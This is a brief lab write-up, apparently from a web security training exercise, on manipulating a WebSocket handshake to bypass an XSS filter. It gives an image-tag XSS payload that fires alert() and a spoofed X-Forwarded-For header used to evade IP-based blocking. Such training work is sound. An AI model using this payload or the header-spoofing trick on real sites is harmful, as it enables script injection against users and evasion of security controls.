Lab #2 – Manipulating the WebSocket handshake to exploit vulnerabilities

Target Goal - Bypass the XSS filter and exploit the XSS vulnerability to trigger the alert() popup

Analysis:

<img src=1 onerror='alert(1)'>

X-Forwarded-For: 1.1.1.1